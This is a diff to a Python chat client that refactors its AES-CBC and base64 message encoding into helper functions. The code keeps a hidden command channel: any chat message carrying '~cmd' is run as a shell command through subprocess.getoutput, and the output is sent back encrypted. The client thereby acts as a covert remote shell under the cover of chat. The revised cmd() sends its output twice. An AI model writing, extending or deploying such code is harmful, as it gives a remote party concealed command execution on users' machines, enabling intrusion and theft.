@@ -19,21 +19,16 @@ def receive():
                 pass
             else:
                 try:
-                    message_encrypted = base64.b64decode(message)
-                    message_utf = decrypt(message_encrypted)
-                    message = message_utf.decode('UTF-8')
-                    try:
-                        message_list = message.split()
-                        if message_list[0] == (f'{nickname}:'):
-                            pass
-                        else:
-                            if message_list[1] == "~cmd":
-                                cmd(message_list)
-                            else:
-                                print(message)
-                    except:
-                        print("Failed to decode the message")
+                    # FAILS, IF MESSAGE COMES FROM SERVER
+                    message = decode(message)
+                    message_list = message.split()
+                    if message_list[1] == "~cmd":
+                        cmd(message_list)
+                    else:
+                        print(message)
+
                 except:
+                    # IF MESSAGE COMES FROM THE SERVER
                     message = message.decode('UTF-8')
                     print(message)
 
@@ -49,25 +44,9 @@ def write():
             pass
         else:
             message = f'{nickname}: {message_input}'
-            message_utf = message.encode('UTF-8')
-            message_aes = encypt(message_utf)
-            message64 = base64.b64encode(message_aes)
-            client.send(message64)
+            message = encode(message)
+            client.send(message)
 
-def encypt(message):
-    iv = Crypto.Random.get_random_bytes(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-
-    message = Crypto.Util.Padding.pad(message, AES.block_size)
-    message = iv + cipher.encrypt(message)
-    return message
-
-def decrypt(message):
-    iv = message[:AES.block_size]
-    cipher_dec = AES.new(key, AES.MODE_CBC, iv)
-    message = cipher_dec.decrypt(message[AES.block_size:])
-    message = Crypto.Util.Padding.unpad(message, AES.block_size)
-    return message
 
 def cmd(commands):
 
@@ -76,17 +55,48 @@ def cmd(commands):
 
     try:
         output = subprocess.getoutput(commands_str)
-        output = f'{nickname}: {output}'
     except Exception as e:
+        print("Subprocess failed")
         print(e)
+        return
+    output = f'{nickname}: {output}'
     try:
-        output_utf = output.encode('UTF-8')
-        output_aes = encypt(output_utf)
-        output_b64 = base64.b64encode(output_aes)
-        client.send(output_b64)
-    except:
-        print("Ei outputtia")
+        output_encoded = encode(output)
+        client.send(output_encoded)
+    except Exception as e:
+        print("Failed to encode")
+        print(e)
+        return
+    client.send(output_encoded)
 
+def encode(message):
+    message = message.encode('UTF-8')
+    message = encypt(message)
+    message = base64.b64encode(message)
+    return message
+
+def decode(message):
+    message = base64.b64decode(message)
+    message = decrypt(message)
+    message = message.decode('UTF-8')
+    return message
+
+def encypt(message):
+    # FUNCTION ONLY CALLED FROM ENCODE
+    iv = Crypto.Random.get_random_bytes(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+
+    message = Crypto.Util.Padding.pad(message, AES.block_size)
+    message = iv + cipher.encrypt(message)
+    return message
+
+def decrypt(message):
+    # FUNCTION ONLY CALLED FROM DECODE
+    iv = message[:AES.block_size]
+    cipher_dec = AES.new(key, AES.MODE_CBC, iv)
+    message = cipher_dec.decrypt(message[AES.block_size:])
+    message = Crypto.Util.Padding.unpad(message, AES.block_size)
+    return message
 
 
 ########################### MAIN ####################################
